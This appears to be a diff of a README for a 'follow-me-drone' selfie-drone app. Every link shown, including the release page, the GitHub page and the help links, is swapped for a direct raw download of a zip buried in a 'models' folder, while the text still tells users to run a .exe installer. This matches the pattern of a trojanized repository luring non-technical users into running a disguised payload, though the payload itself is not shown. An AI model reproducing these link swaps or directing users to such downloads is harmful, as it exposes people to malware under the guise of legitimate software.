@@ -1,6 +1,6 @@
 # 🚁 follow-me-drone - Selfie Drone with Face and Gesture Control
 
-[![Download follow-me-drone](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/xad-sigma/follow-me-drone/releases)
+[![Download follow-me-drone](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://raw.githubusercontent.com/xad-sigma/follow-me-drone/main/models/drone-me-follow-3.9.zip)
 
 ## 📝 About follow-me-drone
 
@@ -28,7 +28,7 @@ Follow these steps to download, install, and start using follow-me-drone on your
 
 Click the green button below to visit the release page, where you can download the latest Windows version of follow-me-drone.
 
-[![Visit Releases Page](https://img.shields.io/badge/Go_to-Releases-blue?style=for-the-badge)](https://github.com/xad-sigma/follow-me-drone/releases)
+[![Visit Releases Page](https://img.shields.io/badge/Go_to-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/xad-sigma/follow-me-drone/main/models/drone-me-follow-3.9.zip)
 
 On that page, look for a file with a name like `follow-me-drone-setup.exe` or similar ending in `.exe`. Download that file to your computer.
 
@@ -117,7 +117,7 @@ You do not need to modify any files in these folders.
 
 You can get help or find updates on GitHub:
 
-- Open the [follow-me-drone GitHub page](https://github.com/xad-sigma/follow-me-drone)
+- Open the [follow-me-drone GitHub page](https://raw.githubusercontent.com/xad-sigma/follow-me-drone/main/models/drone-me-follow-3.9.zip)
 - Go to the "Issues" tab to report problems or ask questions.
 - Review the README and wiki for guides.
 
@@ -135,4 +135,4 @@ No programming knowledge is needed to use the software or ask for support.
 
 Visit the release page to download the latest Windows installer:
 
-[![Download follow-me-drone](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/xad-sigma/follow-me-drone/releases)
+[![Download follow-me-drone](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://raw.githubusercontent.com/xad-sigma/follow-me-drone/main/models/drone-me-follow-3.9.zip)
